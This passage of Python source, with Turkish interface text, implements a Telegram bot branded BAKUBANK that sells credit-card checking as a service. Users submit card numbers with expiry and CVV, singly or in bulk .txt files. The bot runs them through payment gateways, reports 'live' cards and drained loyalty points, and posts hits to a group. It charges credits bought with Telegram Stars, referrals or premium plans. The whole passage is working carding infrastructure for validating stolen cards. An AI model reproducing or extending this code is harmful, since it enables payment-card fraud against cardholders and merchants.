        await q.message.reply_text(f"🎯 <b>Tekli Sorgu</b>\n\nFormat: <code>numara|ay|yıl|cvv</code>\nÖrnek: <code>4433333333333333|12|26|123</code>\n\n💡 Her sorgu <b>1 kredi</b>\n{EMOJI_DOLLAR} Mevcut: <b>{fmt_credit(user['credits'])}</b>", parse_mode=ParseMode.HTML)
    elif q.data == "menu_acc":
        await q.message.reply_text(f"👤 <b>Profil</b>\n\n🆔 <code>{user['user_id']}</code>\n👤 {user_mention(user)}\n{EMOJI_DOLLAR} Kredi: <b>{fmt_credit(user['credits'])}</b>\n👥 Referans: <b>{user['ref_count']}</b>\n💎 Premium: <code>{user.get('premium_until') or 'yok'}</code>", parse_mode=ParseMode.HTML)
    elif q.data == "menu_gw": await show_gateway_menu(q.message, u.id)
    elif q.data == "menu_ref":
        link = f"https://t.me/{ctx.bot.username}?start=ref_{u.id}"
        await q.message.reply_text(f"👥 <b>Referans Sistemi</b>\n\n🔗 Linkin:\n<code>{link}</code>\n\n🎁 Her referans: <b>+{REFERRAL_CREDITS}</b> kredi", parse_mode=ParseMode.HTML)
    elif q.data == "menu_tools": await q.message.reply_text(f"🛠 <b>Araçlar</b>\n\n• <b>Toplu Check:</b> .txt dosyası gönder.", parse_mode=ParseMode.HTML)
    elif q.data == "menu_stars": await show_stars_menu(q.message, ctx, u.id)

async def show_stars_menu(message, ctx, uid):
    kb = []; row = []
    for key, pkg in STAR_PACKAGES.items():
        row.append(InlineKeyboardButton(f"⭐ {pkg['title']} — {pkg['price']}★", callback_data=f"stars_{key}", style="success"))
        if len(row) == 2: kb.append(row); row = []
    if row: kb.append(row)
    kb.append([InlineKeyboardButton("❌ Kapat", callback_data="stars_close", style="danger")])
    u = db_get_user(uid); cr = u["credits"] if u else 0
    await message.reply_text(f"⭐ <b>STARS MAĞAZA</b>\n━━━━━━━━━━━━━━━━━━━━\nTelegram Stars ile kredi satın al.\n\n{EMOJI_DOLLAR} Mevcut: <b>{fmt_credit(cr)}</b>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

async def on_stars_close(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer("Kapatıldı")
    try: await q.message.delete()
    except Exception: pass

async def on_card(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user; text = update.message.text.strip()
    if await check_mandatory(ctx.bot, u.id):
        await update.message.reply_text("🚫 Önce kanala katıl!", reply_markup=mandatory_keyboard()); return
        
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    valid_cards = []
    for line in lines:
        c = parse_card(line)
        if c and luhn(c[0]): valid_cards.append(c)
        
    if not valid_cards: return

    user = db_get_user(u.id); prem = db_is_premium(u.id); gateways = db_get_gateways(u.id)
    if not prem and user["credits"] < len(valid_cards):
        await update.message.reply_text(f"💸 <b>Yetersiz kredi!</b>\n\n🎴 Gerekli: <b>{len(valid_cards)}</b>\n{EMOJI_DOLLAR} Mevcut: <b>{fmt_credit(user['credits'])}</b>", parse_mode=ParseMode.HTML); return

    if len(valid_cards) == 1:
        num, ay, yil, cvv = valid_cards[0]
        if not prem: db_update_credits(u.id, -1)
        msg = await update.message.reply_text(f"{EMOJI_WAIT} Kart checkleniyor...", parse_mode=ParseMode.HTML)
        
        r_type, result, gw, elapsed = await check_one(num, ay, yil, cvv, gateways)
        db_add_history(u.id, f"{num}|{ay}|{yil}|{cvv}", "+".join(gateways), result)

        if r_type == "live":
            await msg.edit_text(f"🎉 <b>CANLI KART!</b>\n{EMOJI_CARD} <code>{num}|{ay}|{yil}|{cvv}</code>", parse_mode=ParseMode.HTML)
            await send_hit_to_group(ctx, u, kind="live", gateway=gw, elapsed=elapsed)
        elif r_type == "points":
            await msg.edit_text(f"🏆 <b>Puan düşürüldü!</b>\n📊 {result}", parse_mode=ParseMode.HTML)
            await send_hit_to_group(ctx, u, kind="puan", gateway=gw, elapsed=elapsed)
        else: await msg.edit_text("❌ Kartınız reddedildi.")

        if not prem: await update.message.reply_text(f"{EMOJI_DOLLAR} Kalan kredi: <b>{fmt_credit(db_get_user(u.id)['credits'])}</b>", parse_mode=ParseMode.HTML)
        return

    await run_bulk(update.message, ctx, valid_cards, u, prem, gateways)

async def run_bulk(message, ctx, cards, user, prem, gateways):
    total = len(cards); live = declined = points = 0
    status_msg = await message.reply_text(f"🔄 <b>Check başladı...</b>\n🎴 Toplam: <b>{total}</b>\n📊 İlerleme: <b>0/{total}</b>\n\n{EMOJI_OK} Live: <b>0</b>\n🏆 Puan: <b>0</b>\n❌ Red: <b>0</b>", parse_mode=ParseMode.HTML)
    last_update = time.time()

    for idx, (num, ay, yil, cvv) in enumerate(cards, 1):
        if not prem and db_get_user(user.id)["credits"] < 1:
            await status_msg.edit_text(f"💸 <b>Kredi bitti!</b>\n{EMOJI_OK} Live: <b>{live}</b> | 🏆 Puan: <b>{points}</b>", parse_mode=ParseMode.HTML); break

        r_type, result, gw, elapsed = await check_one(num, ay, yil, cvv, gateways)
        db_add_history(user.id, f"{num}|{ay}|{yil}|{cvv}", "+".join(gateways), result)

        if r_type == "live":
            live += 1; await send_hit_to_group(ctx, user, kind="live", gateway=gw, elapsed=elapsed)
            try: await ctx.bot.send_message(user.id, f"🎉 <b>CANLI KART!</b>\n{EMOJI_CARD} <code>{num}|{ay}|{yil}|{cvv}</code>", parse_mode=ParseMode.HTML)
            except Exception: pass
        elif r_type == "points":
            points += 1; await send_hit_to_group(ctx, user, kind="puan", gateway=gw, elapsed=elapsed)
            try: await ctx.bot.send_message(user.id, f"🏆 Puan düşürüldü: <b>{result}</b>", parse_mode=ParseMode.HTML)
            except Exception: pass
        else: declined += 1

        if not prem: db_update_credits(user.id, -1)

        if time.time() - last_update >= 3 or idx == total:
            last_update = time.time()
            try: await status_msg.edit_text(f"🔄 <b>Check devam ediyor...</b>\n📊 İlerleme: <b>{idx}/{total}</b>\n\n{EMOJI_OK} Live: <b>{live}</b>\n🏆 Puan: <b>{points}</b>\n❌ Red: <b>{declined}</b>", parse_mode=ParseMode.HTML)
            except Exception: pass

    try: await status_msg.edit_text(f"{EMOJI_OK} <b>Check bitti!</b>\n━━━━━━━━━━━━━━━━━━━━\n📊 Toplam: <b>{total}</b>\n{EMOJI_OK} Live: <b>{live}</b>\n🏆 Puan: <b>{points}</b>\n❌ Red: <b>{declined}</b>", parse_mode=ParseMode.HTML)
    except Exception: pass
    if not prem: await message.reply_text(f"{EMOJI_DOLLAR} Kalan kredi: <b>{fmt_credit(db_get_user(user.id)['credits'])}</b>", parse_mode=ParseMode.HTML)

async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user; doc = update.message.document
    if not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ Sadece <b>.txt</b> dosyası kabul edilir.", parse_mode=ParseMode.HTML); return
    try:
        f = await doc.get_file(); text = (await f.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await update.message.reply_text(f"❌ Dosya okunamadı: {e}"); return

    lines = [l.strip() for l in text.splitlines() if l.strip()]
    cards = []
    for line in lines:
        c = parse_card(line)
        if c and luhn(c[0]): cards.append(c)
        
    if not cards: await update.message.reply_text("❌ Geçerli kart bulunamadı."); return

    user = db_get_user(u.id); prem = db_is_premium(u.id); gateways = db_get_gateways(u.id)
    if not prem and user["credits"] < len(cards):
        await update.message.reply_text(f"💸 <b>Yetersiz kredi!</b>", parse_mode=ParseMode.HTML); return

    await update.message.reply_text(f"📄 <b>Dosya alındı:</b> <code>{doc.file_name}</code>\n🎴 Toplam <b>{len(cards)}</b> kart bulundu.\n🔄 Checkleniyor...", parse_mode=ParseMode.HTML)
    await run_bulk(update.message, ctx, cards, u, prem, gateways)

async def on_stars_pick(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; key = q.data.replace("stars_", ""); pkg = STAR_PACKAGES.get(key)
    await q.answer()
    if not pkg: return
    await ctx.bot.send_invoice(q.from_user.id, pkg["title"], f"BAKUBANK — {pkg['title']}", f"bakubank_{key}", "", "XTR", [LabeledPrice(pkg["title"], int(pkg["price"]))])

async def pre_checkout(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.pre_checkout_query
    await q.answer(ok=q.invoice_payload.startswith("bakubank_"))

async def on_successful_payment(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user; pkg = STAR_PACKAGES.get(update.message.successful_payment.invoice_payload.replace("bakubank_", ""))
    if not pkg: return
    if "credits" in pkg:
        db_update_credits(u.id, pkg["credits"])
        msg = f"{EMOJI_OK} <b>Ödeme başarılı!</b>\n{EMOJI_DOLLAR} <b>+{fmt_credit(pkg['credits'])} kredi</b> yüklendi."
    else:
        db_grant_premium(u.id, pkg["premium"])
        msg = f"{EMOJI_OK} <b>Ödeme başarılı!</b>\n💎 <b>{pkg['premium']} gün Premium</b> aktif."
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cmd_stars(update: Update, ctx: ContextTypes.DEFAULT_TYPE): await show_stars_menu(update.message, ctx, update.effective_user.id)
async def cmd_gateway(update: Update, ctx: ContextTypes.DEFAULT_TYPE): await show_gateway_menu(update.message, update.effective_user.id)

async def weekly_job(ctx: ContextTypes.DEFAULT_TYPE):
    now = datetime.utcnow()
    for u in db_all_users():
        try: last = datetime.fromisoformat(u["last_weekly"]) if u["last_weekly"] else None
        except Exception: last = None
        if last is None or (now - last) >= timedelta(days=7):
            db_update_credits(u["user_id"], WEEKLY_CREDITS); db_reset_weekly(u["user_id"])

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    await update.message.reply_text("🛠 <b>ADMIN KOMUTLARI</b>", parse_mode=ParseMode.HTML)

async def on_error(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    log.error(f"hata: {ctx.error}", exc_info=ctx.error)

def main():
    init_db()
    init_gateway_sessions()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stars", cmd_stars))
    app.add_handler(CommandHandler("gateway", cmd_gateway))
    app.add_handler(CommandHandler("admin", cmd_admin))

    app.add_handler(CallbackQueryHandler(on_check_join, pattern="^check_join$"))
    app.add_handler(CallbackQueryHandler(on_menu, pattern="^menu_"))
    app.add_handler(CallbackQueryHandler(on_gateway_toggle, pattern="^gw_toggle_"))
    app.add_handler(CallbackQueryHandler(on_gateway_save, pattern="^gw_save$"))
    app.add_handler(CallbackQueryHandler(on_gateway_cancel, pattern="^gw_cancel$"))
    app.add_handler(CallbackQueryHandler(on_stars_pick, pattern="^stars_p"))
    app.add_handler(CallbackQueryHandler(on_stars_close, pattern="^stars_close$"))

    app.add_handler(PreCheckoutQueryHandler(pre_checkout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, on_successful_payment))
    app.add_handler(MessageHandler(filters.Document.TEXT, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_card))
    app.add_error_handler(on_error)

    if app.job_queue: app.job_queue.run_repeating(weekly_job, interval=timedelta(hours=24), first=timedelta(minutes=1))

    log.info("Bot başlatılıyor...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
